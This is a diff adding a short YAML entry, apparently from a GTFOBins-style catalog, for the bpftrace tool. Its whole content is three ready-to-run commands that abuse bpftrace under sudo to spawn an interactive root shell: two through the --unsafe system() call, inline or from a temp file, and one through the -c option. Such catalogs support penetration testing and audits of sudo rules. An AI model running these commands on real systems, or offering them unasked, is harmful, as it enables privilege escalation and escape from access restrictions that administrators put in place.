@@ -1,0 +1,17 @@
+---
+functions:
+  shell:
+  - code: |-
+      bpftrace --unsafe -e 'BEGIN {system("/bin/sh 1<&0");exit()}'
+    contexts:
+      sudo:
+  - code: |-
+      echo 'BEGIN {system("/bin/sh 1<&0");exit()}' >/path/to/temp-file
+      bpftrace --unsafe /path/to/temp-file
+    contexts:
+      sudo:
+  - code: |-
+      bpftrace -c /bin/sh -e 'END {exit()}'
+    contexts:
+      sudo:
+...
